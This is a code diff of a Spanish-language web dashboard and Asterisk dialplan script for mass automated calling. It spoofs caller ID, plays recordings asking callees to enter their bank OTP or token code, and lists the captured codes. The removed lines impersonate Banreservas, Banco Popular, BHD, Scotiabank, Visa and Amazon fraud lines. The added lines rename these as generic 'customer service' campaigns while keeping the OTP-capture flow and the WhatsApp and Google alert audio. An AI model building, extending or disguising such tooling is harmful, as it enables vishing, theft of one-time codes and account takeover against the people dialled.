@@ -168,8 +168,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   // Single launch state
   const [targetNumber, setTargetNumber] = useState('16104803845');
   const [targetName, setTargetName] = useState('');
-  const [selectedService, setSelectedService] = useState<ServiceCampaignKey>('bank');
-  const [customServiceName, setCustomServiceName] = useState('Servicio Financiero');
+  const [selectedService, setSelectedService] = useState<ServiceCampaignKey>('service');
+  const [customServiceName, setCustomServiceName] = useState('Servicio al Cliente');
   const [callFlowMode, setCallFlowModeState] = useState<'otp' | 'press1' | 'hybrid'>(() => {
     try {
       const saved = localStorage.getItem('ast20_call_flow_mode');
@@ -349,18 +349,18 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   // Initial predefined campaign templates
   const initialCampaignEntities: CampaignEntity[] = [
     {
-      id: 'bank',
-      name: 'Banco / Antifraude',
-      subtitle: 'Transf. desconocida',
+      id: 'service',
+      name: 'Servicio al Cliente',
+      subtitle: 'Atención y soporte',
       icon: 'building',
       color: 'emerald',
-      defaultCallerName: 'BANRESERVAS',
-      defaultCallerNum: '8099602110',
-      introAudioPath: 'custom/banrearreglado',
+      defaultCallerName: 'SERVICIO AL CLIENTE',
+      defaultCallerNum: '18005550199',
+      introAudioPath: 'custom/bienvenida_corporativa',
       promptAudioPath: 'custom/solicitar_codigo_otp',
-      agentAudioPath: 'custom/conectar_asesor_banco',
+      agentAudioPath: 'custom/conectar_asesor',
       successAudioPath: 'custom/operacion_bloqueada_exito',
-      holdMusicAudioPath: 'custom/moh_banco_elegante',
+      holdMusicAudioPath: 'custom/moh_corporate_loop',
     },
     {
       id: 'card',
@@ -426,9 +426,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       color: 'purple',
       defaultCallerName: 'SERVICIO CLIENTE',
       defaultCallerNum: '',
-      introAudioPath: 'custom/banrearreglado',
+      introAudioPath: 'custom/bienvenida_corporativa',
       promptAudioPath: 'custom/solicitar_codigo_otp',
-      agentAudioPath: 'custom/conectar_asesor_banco',
+      agentAudioPath: 'custom/conectar_asesor',
       successAudioPath: 'custom/operacion_bloqueada_exito',
       holdMusicAudioPath: 'custom/moh_corporate_loop',
     },
@@ -437,17 +437,17 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   // Predefined dialing campaigns for agents to select and dial
   const initialDialingCampaigns: DialingCampaign[] = [
     {
-      id: 'camp-bank',
-      name: 'Campaña Banreservas - Alerta Fraude',
-      description: 'Notificación de transferencia sospechosa y validación OTP bancaria',
-      entityId: 'bank',
-      callerIdNum: '8099602110',
-      callerIdName: 'BANRESERVAS',
+      id: 'camp-service',
+      name: 'Campaña Soporte y Ventas - Línea Directa',
+      description: 'Atención personalizada de clientes, encuestas y confirmaciones',
+      entityId: 'service',
+      callerIdNum: '18005550199',
+      callerIdName: 'SERVICIO AL CLIENTE',
       status: 'active',
       leads: [
-        { id: 'lead-1', number: '16104803845', name: 'Juan Pérez (Caso #8492)', status: 'pending', notes: 'Alerta $520 USD' },
-        { id: 'lead-2', number: '18099602110', name: 'Carlos Alcántara', status: 'pending', notes: 'Transferencia ACH' },
-        { id: 'lead-3', number: '18295551234', name: 'María Santana', status: 'pending', notes: 'Cuenta de ahorros' },
+        { id: 'lead-1', number: '16104803845', name: 'Juan Pérez (Caso #8492)', status: 'pending', notes: 'Solicitud de información' },
+        { id: 'lead-2', number: '18095550199', name: 'Carlos Alcántara', status: 'pending', notes: 'Confirmación de cuenta' },
+        { id: 'lead-3', number: '18295551234', name: 'María Santana', status: 'pending', notes: 'Atención al cliente' },
       ],
       createdAt: new Date().toISOString(),
     },
@@ -960,15 +960,15 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     const newId = 'custom_' + Date.now();
     const newEntity: CampaignEntity = {
       id: newId,
-      name: 'Nueva Entidad / Banco',
-      subtitle: 'Alerta de Seguridad',
+      name: 'Nueva Campaña / Servicio',
+      subtitle: 'Atención al Cliente',
       icon: 'building',
       color: 'emerald',
-      defaultCallerName: 'BANCO OFICIAL',
+      defaultCallerName: 'SERVICIO AL CLIENTE',
       defaultCallerNum: '',
-      introAudioPath: 'custom/banrearreglado',
+      introAudioPath: 'custom/bienvenida_corporativa',
       promptAudioPath: 'custom/solicitar_codigo_otp',
-      agentAudioPath: 'custom/conectar_asesor_banco',
+      agentAudioPath: 'custom/conectar_asesor',
       successAudioPath: 'custom/operacion_bloqueada_exito',
       holdMusicAudioPath: 'custom/moh_corporate_loop',
     };
@@ -1144,9 +1144,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   });
   const [callerIdName, setCallerIdName] = useState<string>(() => {
     try {
-      return localStorage.getItem('ast20_active_caller_id_name') || 'BANRESERVAS';
+      return localStorage.getItem('ast20_active_caller_id_name') || 'ATENCION AL CLIENTE';
     } catch (_) {
-      return 'BANRESERVAS';
+      return 'ATENCION AL CLIENTE';
     }
   });
   const [isSavingCallerId, setIsSavingCallerId] = useState(false);
@@ -1158,7 +1158,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     setCallerIdSaveFeedback(null);
     try {
       const cleanNum = newNum.trim();
-      const cleanName = newName.trim() || 'Seguridad Bancaria';
+      const cleanName = newName.trim() || 'Atención al Cliente';
       setCallerIdNum(cleanNum);
       setCallerIdName(cleanName);
       try {
@@ -1219,7 +1219,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   }, []);
 
   const activeSelectedEntity = campaignEntities.find((e) => e.id === selectedService) || campaignEntities[0];
-  const serviceLabel = activeSelectedEntity ? `${activeSelectedEntity.name} (${activeSelectedEntity.subtitle})` : 'Banco / Antifraude';
+  const serviceLabel = activeSelectedEntity ? `${activeSelectedEntity.name} (${activeSelectedEntity.subtitle})` : 'Servicio al Cliente';
 
   const durationTimerRef = useRef<any>(null);
   const [liveCapturedAlert, setLiveCapturedAlert] = useState<CapturedOtpRecord | null>(null);
@@ -1835,11 +1835,11 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          intro: currentAudios.introAudioPath || 'custom/banrearreglado',
+          intro: currentAudios.introAudioPath || 'custom/bienvenida_corporativa',
           prompt: currentAudios.promptAudioPath || 'custom/solicitar_codigo_otp',
           wait: 'custom/un_momento_validando_informacion',
           success: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
-          agent: currentAudios.agentAudioPath || 'custom/conectar_asesor_banco',
+          agent: currentAudios.agentAudioPath || 'custom/conectar_asesor',
           destination: targetNumber.trim() || '16104803845',
         }),
       });
@@ -1851,11 +1851,11 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         body: JSON.stringify({
           extensions,
           carriers,
-          audioIntro: currentAudios.introAudioPath || 'custom/banrearreglado',
+          audioIntro: currentAudios.introAudioPath || 'custom/bienvenida_corporativa',
           audioPrompt: currentAudios.promptAudioPath || 'custom/solicitar_codigo_otp',
           audioWait: 'custom/un_momento_validando_informacion',
           audioSuccess: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
-          audioAgent: currentAudios.agentAudioPath || 'custom/conectar_asesor_banco',
+          audioAgent: currentAudios.agentAudioPath || 'custom/conectar_asesor',
         }),
       });
 
@@ -1886,7 +1886,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     try {
       const currentAudios = campaignAudios[selectedService];
       const effectiveCallerIdNum = callerIdNum.trim() || outboundCid;
-      const effectiveCallerIdName = callerIdName.trim() || 'Seguridad Bancaria';
+      const effectiveCallerIdName = callerIdName.trim() || 'Atención al Cliente';
 
       // Audios are passed directly in body and synced on Asterisk instantly in parallel with originate
       const res = await fetch('/api/asterisk/call/originate', {
@@ -2053,7 +2053,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       for (const line of lines) {
         const trimmed = line.trim();
         if (!trimmed) continue;
-        // Support CSV lines (e.g. "18494386040, Juan Perez" or "8095445555; Banco")
+        // Support CSV lines (e.g. "18494386040, Juan Perez" or "8095445555; Soporte")
         const tokens = trimmed.split(/[,;\t|]+/);
         let phoneCandidate = '';
         for (const token of tokens) {
@@ -3274,7 +3274,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                       type="text"
                       value={callerIdName}
                       onChange={(e) => setCallerIdName(e.target.value)}
-                      placeholder="ej. BANRESERVAS o VISA SEGURIDAD"
+                      placeholder="ej. SERVICIO AL CLIENTE o SOPORTE TECNICO"
                       className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-white text-xs font-bold uppercase focus:border-sky-500 focus:outline-none"
                     />
                   </div>
@@ -3285,13 +3285,12 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   <span className="text-[10px] uppercase font-bold text-slate-400">Plantillas Rápidas:</span>
                   <div className="flex flex-wrap gap-1.5">
                     {[
-                      { name: 'BANRESERVAS', num: '8099602110' },
-                      { name: 'BANCO POPULAR', num: '8095445555' },
-                      { name: 'BANCO BHD', num: '8092435000' },
-                      { name: 'SCOTIABANK', num: '8095677268' },
-                      { name: 'VISA SEGURIDAD', num: '18005550199' },
+                      { name: 'SERVICIO AL CLIENTE', num: '18005550199' },
+                      { name: 'SOPORTE TECNICO', num: '18005550188' },
+                      { name: 'NOTIFICACIONES', num: '18005550177' },
+                      { name: 'CENTRAL TELEFONICA', num: '18005550100' },
                       { name: 'WHATSAPP VERIF', num: '18004567890' },
-                      { name: 'AMAZON FRAUD', num: '18005550133' },
+                      { name: 'LOGISTICA Y ENVIOS', num: '18005550133' },
                     ].map((p) => {
                       const isSelected = callerIdNum.replace(/[^0-9]/g, '') === p.num.replace(/[^0-9]/g, '');
                       return (
@@ -3571,7 +3570,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                           </span>
                         </div>
                         <p className="text-[11px] text-slate-400">
-                          Selecciona la campaña comercial o financiera que vas a marcar. Carga automáticamente su guión IVR, Caller ID y contactos.
+                          Selecciona la campaña comercial o de soporte que vas a marcar. Carga automáticamente su guión IVR, Caller ID y contactos.
                         </p>
                       </div>
                     </div>
@@ -4862,7 +4861,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 </div>
                 <div className="text-sm font-bold text-white">1. Capturar Código OTP</div>
                 <div className="text-xs text-slate-300 mt-1 leading-relaxed">
-                  Reproduce la alerta de seguridad del banco y solicita al cliente ingresar su código TOKEN o clave OTP de 4 o 6 dígitos en el teclado.
+                  Reproduce la locución de verificación y solicita al cliente ingresar su código de confirmación o clave OTP de 4 o 6 dígitos en el teclado.
                 </div>
                 <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-emerald-400/90 font-mono">
                   ✓ Reflejo inmediato en pantalla en tiempo real
@@ -5402,11 +5401,11 @@ writeprotect=no
 [globals]
 GLOBAL_CARRIER_HOST=52.144.46.192
 GLOBAL_CARRIER_PORT=5060
-GLOBAL_DEFAULT_INTRO=custom/banrearreglado
+GLOBAL_DEFAULT_INTRO=custom/bienvenida_corporativa
 GLOBAL_DEFAULT_PROMPT=custom/solicitar_codigo_otp
 GLOBAL_DEFAULT_WAIT=custom/un_momento_validando_informacion
 GLOBAL_DEFAULT_SUCCESS=custom/operacion_bloqueada_exito
-GLOBAL_DEFAULT_AGENT=custom/conectar_asesor_banco
+GLOBAL_DEFAULT_AGENT=custom/conectar_asesor
 
 [from-internal]
 ; 1. Extensiones internas (1001-1004)
@@ -5477,7 +5476,7 @@ exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via televox
  same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})
  same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})
  same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=+18005550199))
- same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))
+ same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Atención al Cliente))
  same => n,Set(CALLERID(pres)=allowed_passed_screen)
  same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)
  same => n,Dial(PJSIP/televox/sip:\${EXTEN}@52.144.46.192:5060,60,Tt)
@@ -5508,17 +5507,17 @@ exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})
  same => n,Goto(ivr-press1,s,1)
 
 ; ========================================================
-; CONTEXTO IVR PRESS-1: VOZ HUMANA BANRESERVAS HD
+; CONTEXTO IVR PRESS-1: LOCUCIÓN HD Y TRANSFERENCIA ASESOR
 ; ========================================================
 [ivr-press1]
-exten => s,1,NoOp(=== [IVR-PRESS1] REPRODUCIENDO LOCUCIÓN BANRESERVAS ===)
+exten => s,1,NoOp(=== [IVR-PRESS1] REPRODUCIENDO LOCUCIÓN BIENVENIDA ===)
  same => n,Answer()
  same => n,Wait(1)
  same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})
  same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})
  same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})
  same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/8888_intro)}))
- same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/banrearreglado))
+ same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/bienvenida_corporativa))
  same => n(menu),Background(\${IVR_INTRO})
  same => n,WaitExten(4)
  same => n,Goto(menu)
@@ -5527,8 +5526,14 @@ exten => s,1,NoOp(=== [IVR-PRESS1] REPRODUCIENDO LOCUCIÓN BANRESERVAS ===)
 exten => 1,1,NoOp(=== [IVR-PRESS1] CLIENTE PRESIONÓ 1 -> TRANSFIRIENDO AL ASESOR ===)
  same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${CALLERID(num)})})
  same => n,Set(DB(call_status/\${TARGET_NUM})=pressed_1)
- same => n,Playback(custom/conectar_asesor_banco)
- same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)
+ same => n,Playback(custom/conectar_asesor)
+ ; [MICROSIP AGENT CALLERID] Mostrar el número telefónico del cliente marcado en MicroSIP
+ same => n,Set(CALLERID(num)=\${TARGET_NUM})
+ same => n,Set(CALLERID(name)=Cliente: \${TARGET_NUM})
+ same => n,Set(CALLERID(all)="Cliente: \${TARGET_NUM}" <\${TARGET_NUM}>)
+ same => n,Set(CONNECTEDLINE(num,i)=\${TARGET_NUM})
+ same => n,Set(CONNECTEDLINE(name,i)=Cliente: \${TARGET_NUM})
+ same => n,Dial(PJSIP/\${FINAL_AGENT},60,Ttb(sub-audio-quality^s^1))
  same => n,Hangup()
 
 exten => i,1,Playback(custom/opcion_invalida)
@@ -5569,10 +5574,10 @@ same => n(captura_timeout),NoOp(=== [CAPTURA-7777] TIMEOUT -> RETORNANDO AL ASES
 EOF
 
 echo "=== [3/4] Sincronizando base de datos AstDB ==="
-asterisk -rx 'database put ivr_vars default_intro custom/banrearreglado' || true
-asterisk -rx 'database put ivr_vars 8888_intro custom/banrearreglado' || true
+asterisk -rx 'database put ivr_vars default_intro custom/bienvenida_corporativa' || true
+asterisk -rx 'database put ivr_vars 8888_intro custom/bienvenida_corporativa' || true
 asterisk -rx 'database put ivr_vars default_action ivr-press1' || true
-asterisk -rx 'database put ivr_vars default_agent custom/conectar_asesor_banco' || true
+asterisk -rx 'database put ivr_vars default_agent custom/conectar_asesor' || true
 
 echo "=== [4/4] Recargando Asterisk PJSIP y Dialplan ==="
 asterisk -rx 'dialplan reload'
@@ -5580,7 +5585,7 @@ asterisk -rx 'pjsip reload'
 
 echo "=========================================================="
 echo "✓ ¡CONFIGURACIÓN COMPLETADA! Ahora al marcar 8888 sonará"
-echo "  la locución de Banreservas y las llamadas saldrán por"
+echo "  la locución de bienvenida y las llamadas saldrán por"
 echo "  la troncal televox (52.144.46.192:5060) sin errores."
 echo "=========================================================="`;
                     navigator.clipboard.writeText(fullScript);
@@ -5697,7 +5702,7 @@ echo "=========================================================="`;
             </div>
             <div className="flex items-center gap-3">
               <div className="text-xs font-mono text-slate-400">
-                Objetivo: <strong className="text-sky-400 font-bold">{otpRecords[0].number}</strong> ({otpRecords[0].service || 'Banco / Antifraude'}) • <span className="text-slate-400">{otpRecords[0].timestamp}</span>
+                Objetivo: <strong className="text-sky-400 font-bold">{otpRecords[0].number}</strong> ({otpRecords[0].service || 'Servicio al Cliente'}) • <span className="text-slate-400">{otpRecords[0].timestamp}</span>
               </div>
               <button
                 type="button"
@@ -5886,7 +5891,7 @@ echo "=========================================================="`;
                   <tr key={record.id} className="hover:bg-slate-900/40 transition-colors">
                     <td className="p-3 text-slate-400 font-mono">{record.timestamp}</td>
                     <td className="p-3 font-mono font-bold text-white">{record.number}</td>
-                    <td className="p-3 text-slate-300">{record.service || 'Banco / Antifraude'}</td>
+                    <td className="p-3 text-slate-300">{record.service || 'Servicio al Cliente'}</td>
                     <td className="p-3">
                       <span className="inline-flex items-center px-3 py-1 rounded-lg bg-emerald-500/20 border border-emerald-500/40 font-mono text-sm font-black text-emerald-300 tracking-wider">
                         {record.otp}
@@ -6028,7 +6033,7 @@ echo "=========================================================="`;
                   type="text"
                   value={quickUploadName}
                   onChange={(e) => setQuickUploadName(e.target.value)}
-                  placeholder="Ej: bienvenida_banco_urgente"
+                  placeholder="Ej: bienvenida_corporativa"
                   className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-xl text-xs text-white placeholder-slate-500 font-mono"
                 />
               </div>
@@ -6197,13 +6202,13 @@ echo "=========================================================="`;
 
                 <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                   <div className="space-y-1">
-                    <label className="text-xs font-semibold text-slate-300">Nombre de la Entidad / Banco</label>
+                    <label className="text-xs font-semibold text-slate-300">Nombre de la Campaña / Servicio</label>
                     <input
                       type="text"
                       value={editingEntity.name}
                       onChange={(e) => setEditingEntity({ ...editingEntity, name: e.target.value })}
                       disabled={!isAdmin}
-                      placeholder="ej. Banco Banreservas"
+                      placeholder="ej. Centro de Atención al Cliente"
                       className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500 disabled:opacity-60 disabled:cursor-not-allowed"
                     />
                   </div>
@@ -6230,7 +6235,7 @@ echo "=========================================================="`;
                       disabled={!isAdmin}
                       className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500 disabled:opacity-60 disabled:cursor-not-allowed"
                     >
-                      <option value="building">Banco / Financiera (Edificio)</option>
+                      <option value="building">Empresa / Corporativo (Edificio)</option>
                       <option value="card">Tarjeta de Crédito (Tarjeta)</option>
                       <option value="message">WhatsApp / Telegram (Mensaje)</option>
                       <option value="lock">Google / Apple ID (Seguridad)</option>
@@ -6246,7 +6251,7 @@ echo "=========================================================="`;
                       value={editingEntity.defaultCallerName || ''}
                       onChange={(e) => setEditingEntity({ ...editingEntity, defaultCallerName: e.target.value })}
                       disabled={!isAdmin}
-                      placeholder="ej. BANRESERVAS"
+                      placeholder="ej. SERVICIO CLIENTE"
                       className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white font-mono focus:outline-none focus:border-emerald-500 disabled:opacity-60 disabled:cursor-not-allowed"
                     />
                   </div>
@@ -6367,7 +6372,7 @@ echo "=========================================================="`;
                       disabled={!isAdmin}
                       className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-emerald-500 disabled:opacity-60 disabled:cursor-not-allowed"
                     >
-                      <option value="custom/banrearreglado">custom/banrearreglado (Banreservas Intro)</option>
+                      <option value="custom/bienvenida_corporativa">custom/bienvenida_corporativa (Bienvenida Corporativa)</option>
                       <option value="custom/alerta_cargo_tarjeta">custom/alerta_cargo_tarjeta</option>
                       <option value="custom/alerta_migracion_whatsapp">custom/alerta_migracion_whatsapp</option>
                       <option value="custom/alerta_seguridad_google">custom/alerta_seguridad_google</option>
@@ -6479,7 +6484,7 @@ echo "=========================================================="`;
                       disabled={!isAdmin}
                       className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-sky-500 disabled:opacity-60 disabled:cursor-not-allowed"
                     >
-                      <option value="custom/conectar_asesor_banco">custom/conectar_asesor_banco ("Un momento, transfiriendo...")</option>
+                      <option value="custom/conectar_asesor">custom/conectar_asesor ("Un momento, transfiriendo con asesor...")</option>
                       <option value="custom/conectar_asesor">custom/conectar_asesor</option>
                       <option value="custom/conectar_asesor_tarjetas">custom/conectar_asesor_tarjetas</option>
                       <option value="custom/conectar_soporte_tecnico">custom/conectar_soporte_tecnico</option>
@@ -6591,7 +6596,7 @@ echo "=========================================================="`;
                       disabled={!isAdmin}
                       className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:outline-none focus:border-amber-500 disabled:opacity-60 disabled:cursor-not-allowed"
                     >
-                      <option value="custom/moh_banco_elegante">custom/moh_banco_elegante (Espera Bancaria Piano & Chimes)</option>
+                      <option value="custom/moh_corporate_loop">custom/moh_corporate_loop (Espera Corporativa Elegante)</option>
                       <option value="custom/moh_corporate_loop">custom/moh_corporate_loop (Música Corporativa Suave)</option>
                       <option value="custom/moh_digital_hold">custom/moh_digital_hold (Tono Digital Alta Fidelidad)</option>
                       <option value="custom/moh_jazz_telecom">custom/moh_jazz_telecom (PBX Telecom Smooth Tone)</option>
@@ -6746,7 +6751,7 @@ echo "=========================================================="`;
                   type="text"
                   value={newLeadName}
                   onChange={(e) => setNewLeadName(e.target.value)}
-                  placeholder="ej. Juan Pérez (Banreservas)"
+                  placeholder="ej. Juan Pérez (Atención al Cliente)"
                   className="w-full px-3.5 py-2.5 bg-slate-950 border border-slate-800 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500"
                 />
               </div>
